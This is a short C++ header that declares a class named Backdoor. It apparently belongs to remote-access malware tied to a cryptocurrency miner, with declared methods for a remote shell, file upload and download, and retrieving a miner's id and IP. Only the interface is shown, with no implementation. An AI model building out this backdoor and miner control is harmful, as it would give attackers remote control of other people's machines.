#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"

class Backdoor{
public:
    void shell();
    void upload(char *);
    void download(char *);
    std::string get_miner_id();
    std::string get_miner_ip();
    void menu();
    Backdoor(char *, int, bool);

private:

    Communication *c;
    bool is_server;

};


#endif